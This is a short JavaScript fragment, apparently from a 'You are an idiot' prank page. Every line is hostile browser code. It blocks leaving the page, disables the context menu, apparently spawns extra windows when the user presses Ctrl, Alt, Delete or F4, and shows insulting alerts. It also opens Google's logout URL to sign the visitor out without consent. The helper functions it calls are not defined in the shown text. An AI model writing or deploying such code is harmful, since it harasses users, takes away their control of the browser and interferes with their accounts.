window.onbeforeunload = () => "Are you an idiot?";
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(6);
		alert("You are an idiot!");
	}
	
	return null;
}
window.onload = playBall;

alert("YOU ARE AN IDIOT!! HGAHAHAHA");
window.open("https://www.google.com/accounts/Logout","_blank")
